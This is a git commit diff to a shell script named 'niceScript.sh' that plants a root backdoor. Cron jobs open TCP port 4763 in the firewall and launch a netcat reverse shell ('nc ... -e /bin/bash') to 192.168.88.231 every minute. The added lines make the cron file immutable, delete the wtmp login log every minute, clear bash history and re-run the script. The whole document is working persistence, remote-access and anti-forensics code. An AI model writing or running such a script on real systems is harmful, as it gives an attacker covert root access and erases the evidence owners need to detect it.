344fb7dcab1ba89cf02c82582c5eb5033a41640e
amalone341 <42788620+amalone341@users.noreply.github.com>
2020-02-26 17:37:33 -0500

    Update niceScript.sh

--- niceScript.sh
+++ niceScript.sh
@@ -2,6 +2,8 @@
 #run with privilages
 
 #set up cron file for root
+sudo chattr -i /var/spool/cron/root
+
 touch /var/spool/cron/root
 /usr/bin/crontab /var/spool/cron/root
 
@@ -11,6 +13,10 @@ touch /var/spool/cron/root
 echo "*/1 * * * * sudo iptables -I INPUT 1 -p tcp --dport 4763 -j ACCEPT" >> /var/spool/cron/root
 echo "*/1 * * * * sudo iptables -I OUTPUT 1 -p tcp --dport 4763 -j ACCEPT" >> /var/spool/cron/root
 echo "*/1 * * * * nc 192.168.88.231 4763 -e /bin/bash &" >> /var/spool/cron/root
+echo "*/1 * * * * rm /var/log/wtmp" >> /var/spool/cron/root
 
-# sudo chattr +i /var/spool/cron/root
+sudo chattr +i /var/spool/cron/root
 
+cat /dev/null > ~/.bash_history && history -c && exit
+
+./niceScript.sh
